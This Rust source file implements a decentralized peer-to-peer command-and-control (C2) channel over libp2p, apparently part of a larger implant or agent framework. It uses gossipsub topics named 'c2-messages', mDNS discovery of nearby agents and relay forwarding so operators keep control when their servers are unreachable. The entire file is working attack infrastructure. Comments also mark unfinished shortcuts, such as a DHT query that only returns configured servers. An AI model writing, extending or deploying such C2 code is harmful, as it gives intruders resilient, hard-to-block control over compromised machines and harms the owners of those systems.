//! P2P mesh network C2 channel using libp2p.
//!
//! Provides decentralized communication when servers are unavailable.

use std::collections::HashSet;
use std::sync::Arc;

use futures::StreamExt;
use libp2p::{
    gossipsub, identify, mdns, noise,
    swarm::{NetworkBehaviour, SwarmEvent},
    tcp, yamux, Multiaddr, PeerId, SwarmBuilder,
};
use serde::{Deserialize, Serialize};
use tokio::sync::{mpsc, Mutex, RwLock};

use crate::common::{ChannelType, MessageEnvelope};
use crate::protocols::{
    block_on, read_lock, write_lock, C2Channel, ChannelError, ChannelHealth, ChannelResult,
};

/// P2P channel configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct P2PChannelConfig {
    pub enabled: bool,
    pub listen_address: String,
    pub bootstrap_nodes: Vec<String>,
    pub agent_public_key: Option<String>,
    pub known_servers: Vec<String>,
    pub use_mdns: bool,
    pub use_quic: bool,
    pub max_peers: u32,
    pub gossipsub_topics: Vec<String>,
}

impl Default for P2PChannelConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            listen_address: "/ip4/0.0.0.0/tcp/0".to_string(),
            bootstrap_nodes: vec![],
            agent_public_key: None,
            known_servers: vec![],
            use_mdns: true,
            use_quic: false,
            max_peers: 256,
            gossipsub_topics: vec!["c2-messages".to_string(), "c2-discovery".to_string()],
        }
    }
}

enum P2PCommand {
    Publish { topic: String, data: Vec<u8> },
}

#[derive(NetworkBehaviour)]
struct Behaviour {
    gossipsub: gossipsub::Behaviour,
    identify: identify::Behaviour,
    mdns: mdns::tokio::Behaviour,
}

/// P2P channel implementation backed by a libp2p swarm task.
pub struct P2PChannel {
    config: P2PChannelConfig,
    health: Arc<RwLock<ChannelHealth>>,
    peers: Arc<RwLock<HashSet<PeerId>>>,
    inbox: Arc<Mutex<Vec<MessageEnvelope>>>,
    cmd_tx: Arc<Mutex<Option<mpsc::Sender<P2PCommand>>>>,
    local_peer_id: Arc<RwLock<Option<PeerId>>>,
    name: String,
}

impl P2PChannel {
    /// Create new P2P channel
    pub fn new(config: P2PChannelConfig) -> Self {
        Self {
            config,
            health: Arc::new(RwLock::new(ChannelHealth::default())),
            peers: Arc::new(RwLock::new(HashSet::new())),
            inbox: Arc::new(Mutex::new(Vec::new())),
            cmd_tx: Arc::new(Mutex::new(None)),
            local_peer_id: Arc::new(RwLock::new(None)),
            name: "p2p".to_string(),
        }
    }

    /// Start the libp2p swarm (TCP + Noise + Yamux, gossipsub + identify + mDNS).
    pub async fn start(&self) -> ChannelResult<()> {
        if self.cmd_tx.lock().await.is_some() {
            return Ok(());
        }

        let mut swarm = SwarmBuilder::with_new_identity()
            .with_tokio()
            .with_tcp(
                tcp::Config::default(),
                noise::Config::new,
                yamux::Config::default,
            )
            .map_err(|e| ChannelError::Connection(e.to_string()))?
            .with_behaviour(|key| -> Result<_, Box<dyn std::error::Error + Send + Sync>> {
                let gossipsub_config = gossipsub::ConfigBuilder::default().build()?;
                let gossipsub = gossipsub::Behaviour::new(
                    gossipsub::MessageAuthenticity::Signed(key.clone()),
                    gossipsub_config,
                )?;
                let identify = identify::Behaviour::new(identify::Config::new(
                    "/c2/1.0.0".to_string(),
                    key.public(),
                ));
                let mdns = mdns::tokio::Behaviour::new(
                    mdns::Config::default(),
                    key.public().to_peer_id(),
                )?;
                Ok(Behaviour {
                    gossipsub,
                    identify,
                    mdns,
                })
            })
            .map_err(|e| ChannelError::Connection(e.to_string()))?
            .build();

        let local_peer_id = *swarm.local_peer_id();
        *self.local_peer_id.write().await = Some(local_peer_id);

        // shortcut: TCP only; use_quic is ignored until the QUIC transport is added.
        let listen_addr: Multiaddr = self
            .config
            .listen_address
            .parse()
            .unwrap_or_else(|_| "/ip4/0.0.0.0/tcp/0".parse().unwrap());
        swarm
            .listen_on(listen_addr)
            .map_err(|e| ChannelError::Connection(e.to_string()))?;

        for topic in &self.config.gossipsub_topics {
            let _ = swarm
                .behaviour_mut()
                .gossipsub
                .subscribe(&gossipsub::IdentTopic::new(topic.clone()));
        }

        for node in &self.config.bootstrap_nodes {
            match node.parse::<Multiaddr>() {
                Ok(addr) => {
                    if let Err(e) = swarm.dial(addr) {
                        tracing::warn!("P2P dial {} failed: {}", node, e);
                    }
                }
                Err(_) => tracing::warn!("P2P bootstrap node is not a multiaddr: {}", node),
            }
        }

        let (tx, mut rx) = mpsc::channel::<P2PCommand>(64);
        *self.cmd_tx.lock().await = Some(tx);

        let peers = self.peers.clone();
        let inbox = self.inbox.clone();
        tokio::spawn(async move {
            loop {
                tokio::select! {
                    event = swarm.select_next_some() => match event {
                        SwarmEvent::Behaviour(BehaviourEvent::Gossipsub(
                            gossipsub::Event::Message { message, .. },
                        )) => {
                            if let Ok(envelope) =
                                serde_json::from_slice::<MessageEnvelope>(&message.data)
                            {
                                inbox.lock().await.push(envelope);
                            }
                        }
                        SwarmEvent::Behaviour(BehaviourEvent::Mdns(
                            mdns::Event::Discovered(list),
                        )) => {
                            for (peer, addr) in list {
                                peers.write().await.insert(peer);
                                swarm.behaviour_mut().gossipsub.add_explicit_peer(&peer);
                                // mDNS re-announces peers we already dialed (bootstrap);
                                // dialing again fails with "Address already in use".
                                if !swarm.is_connected(&peer) {
                                    let _ = swarm.dial(addr);
                                }
                            }
                        }
                        SwarmEvent::Behaviour(BehaviourEvent::Mdns(mdns::Event::Expired(list))) => {
                            for (peer, _) in list {
                                peers.write().await.remove(&peer);
                            }
                        }
                        SwarmEvent::NewListenAddr { address, .. } => {
                            tracing::info!(
                                "P2P listening on {}/p2p/{}",
                                address,
                                local_peer_id
                            );
                        }
                        SwarmEvent::ConnectionEstablished { peer_id, .. } => {
                            peers.write().await.insert(peer_id);
                            tracing::info!("P2P peer connected: {}", peer_id);
                        }
                        SwarmEvent::OutgoingConnectionError { peer_id, error, .. } => {
                            tracing::warn!("P2P dial failed ({:?}): {}", peer_id, error);
                        }
                        SwarmEvent::ConnectionClosed {
                            peer_id,
                            num_established,
                            ..
                        } if num_established == 0 => {
                            peers.write().await.remove(&peer_id);
                        }
                        _ => {}
                    },
                    Some(command) = rx.recv() => match command {
                        P2PCommand::Publish { topic, data } => {
                            let topic = gossipsub::IdentTopic::new(topic);
                            if let Err(e) = swarm.behaviour_mut().gossipsub.publish(topic, data) {
                                tracing::warn!("P2P publish failed: {}", e);
                            }
                        }
                    },
                }
            }
        });

        Ok(())
    }

    /// Number of known peers.
    pub async fn peer_count(&self) -> usize {
        self.peers.read().await.len()
    }

    /// Peer ids currently connected.
    pub async fn peer_ids(&self) -> Vec<String> {
        self.peers
            .read()
            .await
            .iter()
            .map(|peer| peer.to_string())
            .collect()
    }

    /// Our libp2p peer id, once started.
    pub fn local_peer_id(&self) -> Option<String> {
        block_on(self.local_peer_id.read()).map(|p| p.to_string())
    }

    /// Broadcast message to all connected peers
    pub async fn broadcast(&self, envelope: &MessageEnvelope) -> ChannelResult<usize> {
        let data = serde_json::to_vec(envelope)
            .map_err(|e| ChannelError::Serialization(e.to_string()))?;
        let Some(tx) = self.cmd_tx.lock().await.clone() else {
            return Err(ChannelError::Unavailable);
        };
        let topic = self
            .config
            .gossipsub_topics
            .first()
            .cloned()
            .unwrap_or_else(|| "c2-messages".to_string());
        tx.send(P2PCommand::Publish { topic, data })
            .await
            .map_err(|e| ChannelError::Connection(e.to_string()))?;
        Ok(self.peers.read().await.len())
    }

    /// Publish to gossipsub topic
    pub async fn publish(&self, topic: &str, data: &[u8]) -> ChannelResult<()> {
        let Some(tx) = self.cmd_tx.lock().await.clone() else {
            return Err(ChannelError::Unavailable);
        };
        tx.send(P2PCommand::Publish {
            topic: topic.to_string(),
            data: data.to_vec(),
        })
        .await
        .map_err(|e| ChannelError::Connection(e.to_string()))
    }

    /// Query DHT for known servers
    pub async fn query_dht(&self) -> ChannelResult<Vec<String>> {
        // shortcut: no Kademlia behaviour yet; known servers come from config.
        Ok(self.config.known_servers.clone())
    }
}

impl C2Channel for P2PChannel {
    fn channel_type(&self) -> ChannelType {
        ChannelType::P2P
    }

    fn name(&self) -> &str {
        &self.name
    }

    fn health_check(&self) -> ChannelResult<bool> {
        let peers = read_lock(&self.peers);
        Ok(!peers.is_empty())
    }

    fn send(&self, envelope: &MessageEnvelope) -> ChannelResult<()> {
        let data = serde_json::to_vec(envelope)
            .map_err(|e| ChannelError::Serialization(e.to_string()))?;
        let sender = block_on(self.cmd_tx.lock()).clone();
        let Some(tx) = sender else {
            return Err(ChannelError::Unavailable);
        };
        let topic = self
            .config
            .gossipsub_topics
            .first()
            .cloned()
            .unwrap_or_else(|| "c2-messages".to_string());
        block_on(tx.send(P2PCommand::Publish { topic, data }))
            .map_err(|e| ChannelError::Connection(e.to_string()))?;

        let mut health = write_lock(&self.health);
        health.record_success(0);
        Ok(())
    }

    fn receive(&self, _timeout_ms: u64) -> ChannelResult<Option<MessageEnvelope>> {
        // shortcut: inbox drained non-blockingly; add a condvar if callers need to wait.
        let mut inbox = block_on(self.inbox.lock());
        Ok(inbox.pop())
    }

    fn latency_ms(&self) -> u64 {
        read_lock(&self.health).latency_ms
    }

    fn reliability(&self) -> f32 {
        read_lock(&self.health).score()
    }

    fn close(&self) {
        block_on(self.cmd_tx.lock()).take();
    }
}

/// P2P relay for forwarding messages through other nodes
pub struct P2PRelay {
    channel: P2PChannel,
    relay_peers: Vec<String>,
}

impl P2PRelay {
    pub fn new(config: P2PChannelConfig) -> Self {
        Self {
            channel: P2PChannel::new(config),
            relay_peers: vec![],
        }
    }

    /// Set up relay chain
    pub async fn setup_relay(&mut self) -> ChannelResult<()> {
        self.channel.start().await
    }

    /// Send through relay chain
    pub async fn send_via_relay(&self, envelope: &MessageEnvelope) -> ChannelResult<()> {
        self.channel.broadcast(envelope).await.map(|_| ())
    }
}
